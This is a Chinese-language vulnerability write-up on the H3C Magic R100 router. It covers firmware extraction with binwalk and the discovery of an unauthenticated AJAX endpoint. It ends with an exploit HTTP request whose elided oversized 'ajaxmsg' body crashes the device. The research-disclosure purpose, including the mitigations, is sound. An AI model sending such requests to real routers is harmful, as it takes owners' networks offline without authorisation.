#  新华三magicR100存在DOS攻击漏洞分析
> ReStr0
> 来源：https://www.iotsec-zone.com/article/122

# 新华三magicR100存在DOS攻击漏洞分析

### 漏洞描述

存在/AJAX/ajaxget接口可以非授权访问，通过ajaxmsg传参发送大量数据进行DOS攻击

版本：<=MagicR100V100R005
<=MagciR100V200R00	

### 漏洞分析与复现

### 一、固件获取和解包

虽然我有物理机，但是我还是从官网下的更新固件包，[https://download.h3c.com.cn/download.do?id=3342938](https://download.h3c.com.cn/download.do?id=3342938)

通过binwalk R100V100R100进行解包,发现可以直接查看到内容，

```shell
ZHEFOX@ZHEFOX-MacOS:~/Desktop$ binwalk R100V100R005.bin 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
33280         0x8200          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 4145728 bytes
1245184       0x130000        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2269691 bytes, 534 inodes, blocksize: 131072 bytes, created: 2018-01-17 03:54:08
```

使用binwalk -eM R100V100R100进行提取

```
ZHEFOX@ZHEFOX-MacOS:~/Desktop$ binwalk -eM R100V100R005.bin 

Scan Time:     2022-03-31 19:12:49
Target File:   /home/ZHEFOX/Desktop/R100V100R005.bin
MD5 Checksum:  42ec9ec3de32216ae2d93ad1ff3a208b
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
33280         0x8200          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 4145728 bytes

WARNING: Symlink points outside of the extraction directory: /home/ZHEFOX/Desktop/_R100V100R005.bin.extracted/squashfs-root/web -> /var/web; changing link target to /dev/null for security purposes.

WARNING: Symlink points outside of the extraction directory: /home/ZHEFOX/Desktop/_R100V100R005.bin.extracted/squashfs-root/dev/log -> /var/tmp/log; changing link target to /dev/null for security purposes.
1245184       0x130000        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2269691 bytes, 534 inodes, blocksize: 131072 bytes, created: 2018-01-17 03:54:08

Scan Time:     2022-03-31 19:12:51
Target File:   /home/ZHEFOX/Desktop/_R100V100R005.bin.extracted/8200
MD5 Checksum:  4b2d56fb09ee2c3feafac6513c01f7c6
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             uImage header, header size: 64 bytes, header CRC: 0xFB26C18E, created: 2018-01-17 03:51:29, image size: 4145664 bytes, Data Address: 0x80001000, Entry Point: 0x800044B0, data CRC: 0x9E4BD9D4, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: none, image name: "Linux Kernel Image"
3194976       0x30C060        Linux kernel version 2.6.30
3260544       0x31C080        CRC32 polynomial table, little endian
3274176       0x31F5C0        SHA256 hash constants, big endian
3281920       0x321400        CRC32 polynomial table, big endian
3475335       0x350787        Neighborly text, "neighbor %.2x%.2x.%.2x:%.2x:%.2x:%.2x:%.2x:%.2x lost on port %d(%s)(%s)"
3477803       0x35112B        HTML document header
3477966       0x3511CE        HTML document footer
3666048       0x37F080        AES S-Box
3974025       0x3CA389        Microsoft executable, MS-DOS
4145216       0x3F4040        ASCII cpio archive (SVR4 with no CRC), file name: "/dev", file name length: "0x00000005", file size: "0x00000000"
4145332       0x3F40B4        ASCII cpio archive (SVR4 with no CRC), file name: "/dev/console", file name length: "0x0000000D", file size: "0x00000000"
4145456       0x3F4130        ASCII cpio archive (SVR4 with no CRC), file name: "/root", file name length: "0x00000006", file size: "0x00000000"
4145572       0x3F41A4        ASCII cpio archive (SVR4 with no CRC), file name: "TRAILER!!!", file name length: "0x0000000B", file size: "0x00000000"
```

成功提取后，进入发现是squashfs架构，在squashfs-root发现了www目录，跟进发现是一个asp网站

### 二、漏洞实现和分析

因为我手上存在一台以前家里用的物理设备，所以我选择直接去测试我的路由器

通过遍历访问的我的所有文件，发现存在一些非授权访问点，比如noauth_password_mobile.asp

此处无需输入账号密码就可以直接进行跳转操作!

![0.png](https://www.iotsec-zone.com/images/MdImg/f29bb2a9b25860e8fffe69b916d5981b.png)

```asp
<FORM action="" method="POST" name=router_password_set>
    <TABLE cellSpacing=0 cellPadding=3 border=0 width=100%>
    <TBODY>
      <TR><TD align=center height=20 colspan=3></TD></TR>
      <TR><TD align=center height=10 colspan=3></TD></TR>
      <TR><TD align=center height=40 colspan=3>
          <input name="login" id="login" type=button style="WIDTH:80%; HEIGHT:45px;" class=mobileButton value="登录" onclick="mySubmit();">
    </TBODY>
    </TABLE>
</FORM>
```

不幸的是他跳转的位置是

```asp
function mySubmit()
{
    location="mobile.asp";
}
```

该文件存在超时检查，所以当我访问的时候它仍然会跳转到登入首页

```asp
var user_expire_time=<%aspGetGroup("get_user_expire_time");%>
```

但是在此处我又发现了一个新的突破点

```asp
function AjaxGetWan1State()
{
    XMLHttpReqtmp = createXMLHttpRequest();
	if (XMLHttpReqtmp)
	{
	    var url = "AJAX/ajaxget";
	    var msg="ajaxmsg=aspGetGroup(Wan1BasicState)";
	    XMLHttpReqtmp.open("POST", url, true);
	    XMLHttpReqtmp.onreadystatechange = processGetWan1StateRsp;//指定响应函数
	    XMLHttpReqtmp.send(msg);  // 发送请求 
	}
}
```

尝试访问[http://192.168.124.1/AJAX/ajaxget](http://192.168.124.1/AJAX/ajaxget) ，发送ajaxmsg=aspGetGroup(Wan1BasicState)，存在回显1;2;1;1;1，发现存在一个非授权访问

![1.png](https://www.iotsec-zone.com/images/MdImg/bfb1132a85686ca465390f936fbb454e.png)

四个标识符号通过分析代码和注释文件，可知分别代表接口禁用、接口down、ping完、超时、请求成功

```asp
  342               XMLHttpReqtmp=null;
  343  			 
  344:              /* 接口禁用、接口down、ping完、超时*/
  345               if (0 == msg_tmp[0] || 4 == msg_tmp[1] || 1 == msg_tmp[4] || getwanstatuscount >= getwanstatusmaxcount)
  346               {   
  ...
  400      {
  401          var url = "AJAX/ajaxget";
  402:         var msg="ajaxmsg=aspGetGroup(Wan1Ping)";
  403          XMLHttpReq.open("POST", url+"?IsVersionCheck=1", true);
  404          XMLHttpReq.onreadystatechange = processWan1StateTestRsp;//指定响应函数

```

```asp
function processWan1StateTestRsp() 
{
    if (XMLHttpReq.readyState == 4) 
	{ // 判断对象状态
		 //alert(XMLHttpReq.responseText+XMLHttpReq.status);
         if ((XMLHttpReq.status >= 200 && XMLHttpReq.status < 300) || XMLHttpReq.status == 304) 
		 { // 信息已经成功返回，开始处理信息
		 	XMLHttpReq=null;
		 	setTimeout("AjaxGetWan1State();",2000);
         }
		 else 
		 { //页面不正常
		 
         }
    }
}
```

于是我尝试去寻找ping接口去实现命令执行，但是发现给出的接口只有输出相关的，在doping.asp界面也加入了超时检查机制，

```asp
<script>
top.user_expire_time = <%aspGetGroup("get_user_expire_time");%>
var rtt="<% aspPing(); %>";
parent.ping_rtt=rtt;
</script>
```

于是参数不可控，正当我发觉似乎没法利用这个非授权访问漏洞RCE的感到沮丧时候，突然发现如果在这个位置发送一个超长的字符串是否可以让他溢出来实现DOS攻击，于是我使用python输出了10w+的字符a，通过exp进行发送，成功将路由器服务崩溃，实现了DOS攻击。在一定情况下（不知道是不是因为我对接口攻击次数太多了导致了一些损坏，正常情况下一次大请求可以直接让路由器完全崩溃）

![2.png](https://www.iotsec-zone.com/images/MdImg/b5426380849309ff679eeb660352ea5e.png)

![3.png](https://www.iotsec-zone.com/images/MdImg/4aabefc3115a3551f860b54e2dd761c0.png)

![4.png](https://www.iotsec-zone.com/images/MdImg/443302c21f1b3c8c18a8d90aeefc7a6d.png)

### EXP：（次数字节数较少，只能让路由器web服务重启，当增加到几十万时路由器将崩溃哦）

```html
POST /AJAX/ajaxget HTTP/1.1
Host: 192.168.124.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.55
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 78430
Origin: http://192.168.124.1
Connection: close
Referer: http://192.168.124.1/AJAX/ajaxget
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

ajaxmsg=此处省略
```

```
//请求包越大越好
```

### 解决措施

##### 产品恢复正常

断电重启路由器即可，无需重置，如果重启无效，需要重置。

##### 漏洞防御

1.通过对ajax的非授权访问进行限制

2.对msg传入进行限制
